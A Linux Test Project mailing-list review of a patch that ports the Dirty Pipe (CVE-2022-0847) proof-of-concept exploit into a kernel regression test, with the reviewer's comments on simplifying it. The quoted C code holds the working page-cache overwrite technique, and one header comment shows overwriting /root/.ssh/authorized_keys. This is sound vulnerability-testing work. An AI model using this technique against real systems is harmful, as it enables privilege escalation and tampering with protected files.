Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 671ABC43334
	for <ltp@archiver.kernel.org>; Mon, 11 Jul 2022 11:05:13 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id 850D23CA70B
	for <ltp@archiver.kernel.org>; Mon, 11 Jul 2022 13:05:10 +0200 (CEST)
Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it [217.194.8.2])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (P-384))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id C8D1A3CA562
 for <ltp@lists.linux.it>; Mon, 11 Jul 2022 13:05:00 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.220.28])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-2.smtp.seeweb.it (Postfix) with ESMTPS id CA7F460067C
 for <ltp@lists.linux.it>; Mon, 11 Jul 2022 13:04:59 +0200 (CEST)
Received: from relay2.suse.de (relay2.suse.de [149.44.160.134])
 by smtp-out1.suse.de (Postfix) with ESMTP id EF8312279B;
 Mon, 11 Jul 2022 11:04:58 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
 t=1657537498;
 h=from:from:reply-to:reply-to:date:date:message-id:message-id:to:to:
 cc:cc:mime-version:mime-version:content-type:content-type:
 in-reply-to:in-reply-to:references:references;
 bh=MYLiuger0Y4fre7tgPnMsWDg95VNkkgPmXW9+gusULE=;
 b=0WH/7RzEC7xNJ/gnPVaxe+98wa+C2Uq9cnGREex5Ya+1HUUTrJ1roau2/LwZeHuOGkyzof
 wZcM2nM83Nwx7WkdSktHFDRnbiZLRcO7QH1t3dp8XaMUSsLf0zrDh4rDcquMZZ3dZzU98o
 jSQNdLtBFOZUkCQd4zEzsXVYPN1JYFg=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
 s=susede2_ed25519; t=1657537498;
 h=from:from:reply-to:reply-to:date:date:message-id:message-id:to:to:
 cc:cc:mime-version:mime-version:content-type:content-type:
 in-reply-to:in-reply-to:references:references;
 bh=MYLiuger0Y4fre7tgPnMsWDg95VNkkgPmXW9+gusULE=;
 b=d5bgr4oJDd/yEJOwWbo51Kbyfz74h2JSwtnSKdpm8Zbo5LKPR5OFKUQ0Ckn75K6tqB0yxe
 J4Y9iwAmsHPvviAg==
Received: from g78 (unknown [10.163.24.226])
 (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 (No client certificate requested)
 by relay2.suse.de (Postfix) with ESMTPS id 938B12C141;
 Mon, 11 Jul 2022 11:04:58 +0000 (UTC)
References: <1657190667-2220-1-git-send-email-xuyang2018.jy@fujitsu.com>
User-agent: mu4e 1.6.10; emacs 28.1
From: Richard Palethorpe <rpalethorpe@suse.de>
To: Yang Xu <xuyang2018.jy@fujitsu.com>
Date: Mon, 11 Jul 2022 11:26:48 +0100
In-reply-to: <1657190667-2220-1-git-send-email-xuyang2018.jy@fujitsu.com>
Message-ID: <87k08joqp7.fsf@suse.de>
MIME-Version: 1.0
X-Virus-Scanned: clamav-milter 0.102.4 at in-2.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH] security/dirtypipe: Add test for CVE-2022-0847
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Reply-To: rpalethorpe@suse.de
Cc: ltp@lists.linux.it
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hello,

Yang Xu <xuyang2018.jy@fujitsu.com> writes:

> Fixes: #921
> Signed-off-by: Yang Xu <xuyang2018.jy@fujitsu.com>
> ---
>  runtest/cve                                   |   1 +
>  runtest/syscalls                              |   1 +
>  .../kernel/security/dirtypipe/.gitignore      |   1 +
>  testcases/kernel/security/dirtypipe/Makefile  |   6 +
>  .../kernel/security/dirtypipe/dirtypipe.c     | 195 ++++++++++++++++++
>  5 files changed, 204 insertions(+)
>  create mode 100644 testcases/kernel/security/dirtypipe/.gitignore
>  create mode 100644 testcases/kernel/security/dirtypipe/Makefile
>  create mode 100644 testcases/kernel/security/dirtypipe/dirtypipe.c
>
> diff --git a/runtest/cve b/runtest/cve
> index eaaaa19d7..9ab6dc282 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -72,5 +72,6 @@ cve-2021-4034 execve06
>  cve-2021-22555 setsockopt08 -i 100
>  cve-2021-26708 vsock01
>  cve-2021-22600 setsockopt09
> +cve-2022-0847 dirtypipe
>  # Tests below may cause kernel memory leak
>  cve-2020-25704 perf_event_open03
> diff --git a/runtest/syscalls b/runtest/syscalls
> index a0935821a..efef18136 100644
> --- a/runtest/syscalls
> +++ b/runtest/syscalls
> @@ -1035,6 +1035,7 @@ process_vm_writev02 process_vm_writev02
>  
>  prot_hsymlinks prot_hsymlinks
>  dirtyc0w dirtyc0w
> +dirtypipe dirtypipe
>  
>  pselect01 pselect01
>  pselect01_64 pselect01_64
> diff --git a/testcases/kernel/security/dirtypipe/.gitignore b/testcases/kernel/security/dirtypipe/.gitignore
> new file mode 100644
> index 000000000..fdf39eed2
> --- /dev/null
> +++ b/testcases/kernel/security/dirtypipe/.gitignore
> @@ -0,0 +1 @@
> +/dirtypipe
> diff --git a/testcases/kernel/security/dirtypipe/Makefile b/testcases/kernel/security/dirtypipe/Makefile
> new file mode 100644
> index 000000000..5ea7d67db
> --- /dev/null
> +++ b/testcases/kernel/security/dirtypipe/Makefile
> @@ -0,0 +1,6 @@
> +# SPDX-License-Identifier: GPL-2.0-or-later
> +
> +top_srcdir		?= ../../../..
> +
> +include $(top_srcdir)/include/mk/testcases.mk
> +include $(top_srcdir)/include/mk/generic_leaf_target.mk
> diff --git a/testcases/kernel/security/dirtypipe/dirtypipe.c b/testcases/kernel/security/dirtypipe/dirtypipe.c
> new file mode 100644
> index 000000000..dfe7f5985
> --- /dev/null
> +++ b/testcases/kernel/security/dirtypipe/dirtypipe.c
> @@ -0,0 +1,195 @@
> +// SPDX-License-Identifier: GPL-2.0
> +/*
> + * Copyright 2022 CM4all GmbH / IONOS SE
> + *
> + * Author: Max Kellermann <max.kellermann@ionos.com>
> + *
> + * Ported into ltp by Yang Xu <xuyang2018.jy@fujitsu.com>
> + */
> +
> +/*\
> + * [Description]
> + *
> + * Proof-of-concept exploit for the Dirty Pipe
> + * vulnerability (CVE-2022-0847) caused by an uninitialized
> + * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
> + * file contents in the page cache, even if the file is not permitted
> + * to be written, immutable or on a read-only mount.
> + *
> + * This exploit requires Linux 5.8 or later; the code path was made
> + * reachable by commit f6dd975583bd ("pipe: merge
> + * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
> + * there before, it just provided an easy way to exploit it.
> + *
> + * There are two major limitations of this exploit: the offset cannot
> + * be on a page boundary (it needs to write one byte before the offset
> + * to add a reference to this page to the pipe), and the write cannot
> + * cross a page boundary.
> + *
> + * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
> + *
> + * Further explanation: https://dirtypipe.cm4all.com/
> + */

Thanks for doing the conversion, this is an important test IMO. However
it needs to be simplified. There is code here that mede sense in the
original PoC, but is just a maintenance risk here. Please see below.


> +
> +#ifndef _GNU_SOURCE
> +#define _GNU_SOURCE
> +#endif
> +#include <unistd.h>
> +#include <fcntl.h>
> +#include <stdio.h>
> +#include <stdlib.h>
> +#include <string.h>
> +#include <sys/stat.h>
> +#include <sys/user.h>
> +#include "tst_test.h"
> +
> +#define TEXT "AAAAAAAABBBBBBBB"
> +#define TESTFILE "testfile"
> +#define CHUNK 64
> +#define BUFSIZE 4096
> +
> +static int p[2] = {-1, -1}, fd = -1, page_size;
> +static char *write_buf, *read_buf;
> +
> +static void check_file_contents(void)
> +{
> +	SAFE_LSEEK(fd, 0, SEEK_SET);
> +	SAFE_READ(1, fd, read_buf, 4096);
> +
> +	if (memcmp(write_buf, read_buf, 4096) != 0)
> +		tst_res(TFAIL, "read buf data mismatch, bug exists");
> +	else
> +		tst_res(TPASS, "read buff data match, bug doesn't exist");
> +}
> +
> +/*
> + * Create a pipe where all "bufs" on the pipe_inode_info ring have the
> + * PIPE_BUF_FLAG_CAN_MERGE flag set.
> + */
> +static void prepare_pipe(void)
> +{
> +	unsigned int pipe_size, total, n, len;
> +	char buffer[BUFSIZE];
> +
> +	SAFE_PIPE(p);
> +	pipe_size = SAFE_FCNTL(p[1], F_GETPIPE_SZ);
> +
> +	/*
> +	 * fill the pipe completely; each pipe_buffer will now have the
> +	 * PIPE_BUF_FLAG_CAN_MERGE flag
> +	 */
> +	for (total = pipe_size; total > 0;) {
> +		n = total > sizeof(buffer) ? sizeof(buffer) : total;
> +		len = SAFE_WRITE(1, p[1], buffer, n);
> +		total -= len;
> +	}
> +
> +	/*
> +	 * drain the pipe, freeing all pipe_buffer instances (but leaving the
> +	 * flags initialized)
> +	 */
> +	for (total = pipe_size; total > 0;) {
> +		n = total > sizeof(buffer) ? sizeof(buffer) : total;
> +		len = SAFE_READ(1, p[0], buffer, n);
> +		total -= len;
> +	}
> +
> +	/*
> +	 * the pipe is now empty, and if somebody adds a new pipe_buffer
> +	 * without initializing its "flags", the buffe wiill be mergeable
> +	 */
> +}
> +
> +static void run(void)
> +{
> +	off_t offset;
> +	int data_size, len;
> +	struct stat st;
> +	ssize_t nbytes;
> +	loff_t next_page, end_offset;
> +
> +	offset = 1;
> +	data_size = strlen(TEXT);
> +	next_page = (offset | (page_size - 1)) + 1;

I think if the offset is 1 then the next page is just page_size + 1.

> +	end_offset = offset + (loff_t)data_size;
> +	if (end_offset > next_page)
> +		tst_brk(TFAIL, "Sorry, cannot write across a page
> boundary");
> +
> +	fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	SAFE_FSTAT(fd, &st);
> +
> +	if (offset > st.st_size)
> +		tst_brk(TFAIL, "Offset is not inside the file");
> +	if (end_offset > st.st_size)
> +		tst_brk(TFAIL, "Sorry, cannot enlarget the file");

This checks the file was written to with enough data already. We can do
that in setup or not at all. Also the error message should make
sense. It makes sense in the original reproducer which takes arbtrary
files and offsets, but not here.

> +
> +	/*
> +	 * create the pipe with all flags initialized with
> +	 * PIPE_BUF_FLAG_CAN_MERGE
> +	 */

This comment is redundant

> +	prepare_pipe();
> +
> +	/*
> +	 * splice one byte from before the specified offset into the pipe;
> +	 * this will add a reference to the page cache, but since
> +	 * copy_page_to_iter_pipe() does not initialize the "flags",
> +	 * PIPE_BUF_FLAG_CAN_MERGE is still set
> +	 */
> +	--offset;

So we just use an offset of 0. The above code can probably all be
removed.

> +	nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
> +	if (nbytes < 0)
> +		tst_brk(TFAIL, "splice failed");
> +	if (nbytes == 0)
> +		tst_brk(TFAIL, "short splice");
> +
> +	/*
> +	 * the following write will not create a new pipe_buffer, but
> +	 * will instead write into the page cache, because of the
> +	 *  PIPE_BUF_FLAG_CAN_MERGE flag
> +	 */
> +	len = SAFE_WRITE(1, p[1], TEXT, data_size);
> +	if (len < nbytes)
> +		tst_brk(TFAIL, "short write");
> +
> +	check_file_contents();
> +	SAFE_CLOSE(p[0]);
> +	SAFE_CLOSE(p[1]);
> +	SAFE_CLOSE(fd);
> +}
> +
> +static void setup(void)
> +{
> +	memset(write_buf, 0xff, 4096);
> +
> +	page_size = SAFE_SYSCONF(_SC_PAGESIZE);

I don't think we even need the page size, we can just assume it is >=
4Kb which TEXT is not close to in size.

> +
> +	/*write 4k 0xff to file*/

Inline comments which are describing non-obvious things about kernel
internals are fine. However this is just describing what an LTP library
function does. It's against the style guide.

> +	tst_fill_file(TESTFILE, 0xff, CHUNK, BUFSIZE / CHUNK);

write_buf isn't used for writing. I think it would be better to call it
pattern_buf or just check the first sizeof(TEXT) bytes are not 0xff.

> +}
> +
> +static void cleanup(void)
> +{
> +	if (p[0] > -1)
> +		SAFE_CLOSE(p[0]);
> +	if (p[1] > -1)
> +		SAFE_CLOSE(p[1]);
> +	if (fd > -1)
> +		SAFE_CLOSE(fd);
> +}
> +
> +static struct tst_test test = {
> +	.setup = setup,
> +	.cleanup = cleanup,
> +	.test_all = run,
> +	.needs_tmpdir = 1,
> +	.bufs = (struct tst_buffers []) {
> +		{&write_buf, .size = 4096},
> +		{&read_buf, .size = 4096},
> +		{},
> +	},
> +	.tags = (const struct tst_tag[]) {
> +		{"linux-git", "9d2231c5d74e"},
> +		{"CVE", "CVE-2022-0847"},
> +		{},
> +	}
> +};
> -- 
> 2.27.0



-- 
Thank you,
Richard.

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
